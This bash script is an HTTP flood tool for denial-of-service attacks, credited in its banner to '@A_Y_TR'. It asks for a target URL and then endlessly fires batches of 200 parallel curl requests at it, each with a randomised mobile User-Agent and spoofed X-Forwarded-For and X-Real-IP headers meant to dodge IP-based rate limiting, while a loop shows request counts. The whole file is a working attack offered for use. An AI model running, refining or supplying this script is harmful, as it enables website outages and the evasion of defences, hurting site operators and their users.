#!/bin/bash

# Variables
URL=""
SUCCESS_COUNT=0
FAILURE_COUNT=0
THREADS=200
PORT=4000

# Colors for text
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
NC="\e[0m" # No color

# Clear the terminal and display the title
clear
echo -e "${CYAN}"
echo "██████╗ ███████╗"
echo "██╔══██╗██╔════╝"
echo "██║  ██║█████╗  "
echo "██║  ██║██╔══╝  "
echo "██████╔╝██"
echo "╚═════╝ ╚═"
echo -e "${YELLOW}------------------------------------${NC}"
echo -e "${YELLOW}   Developed by:@A_Y_TR             ${NC}"
echo -e "${YELLOW}------------------------------------${NC}"
echo

# Input the target URL
echo -e "${YELLOW}Enter the target URL (with http or https): ${NC}"
read -r URL

# Function to generate random IP
generate_random_ip() {
    echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
}

# Function to generate random User-Agent
generate_user_agent() {
    echo "Mozilla/5.0 (Linux; Android $(shuf -i 4-12 -n 1)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$(shuf -i 70-100 -n 1).0.$(shuf -i 1000-4000 -n 1).$(shuf -i 50-150 -n 1) Mobile Safari/537.36"
}

# Function to send an HTTP/HTTPS request
send_request() {
    local RANDOM_IP
    RANDOM_IP=$(generate_random_ip)
    local USER_AGENT
    USER_AGENT=$(generate_user_agent)

    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "User-Agent: $USER_AGENT" \
        -H "X-Forwarded-For: $RANDOM_IP" \
        -H "X-Real-IP: $RANDOM_IP" \
        "$URL")
    
    if [[ "$RESPONSE" == "200" ]]; then
        ((SUCCESS_COUNT++))
    else
        ((FAILURE_COUNT++))
    fi
}

# Function to start the attack
start_attack() {
    while :; do
        for ((i = 0; i < THREADS; i++)); do
            send_request &
        done
        wait
    done
}

# Function to display stats
display_stats() {
    while :; do
        clear
        echo -e "${CYAN}██████╗ ███████╗"
        echo -e "██╔══██╗██╔════╝"
        echo -e "██║  ██║█████╗  "
        echo -e "██║  ██║██╔══╝  "
        echo -e "██████╔╝██╗"
        echo -e "╚═════╝ ╚══════╝${NC}"
        echo -e "${GREEN}------------------------------------${NC}"
        echo -e "Attacking URL: ${YELLOW}${URL}${NC}"
        echo -e "${GREEN}Successful Requests: ${SUCCESS_COUNT}${NC}"
        echo -e "${RED}Failed Requests: ${FAILURE_COUNT}${NC}"
        echo -e "${YELLOW}------------------------------------${NC}"
        sleep 2
    done
}

# Run the attack and stats in parallel
start_attack &
display_stats
